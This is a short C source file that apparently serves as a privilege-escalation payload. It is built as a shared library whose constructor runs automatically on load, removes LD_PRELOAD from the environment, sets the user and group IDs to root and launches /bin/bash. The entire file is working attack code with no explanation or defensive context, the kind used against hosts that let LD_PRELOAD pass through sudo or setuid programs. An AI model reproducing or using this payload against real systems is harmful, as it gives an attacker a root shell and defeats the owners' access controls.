#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
        unsetenv("LD_PRELOAD");
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
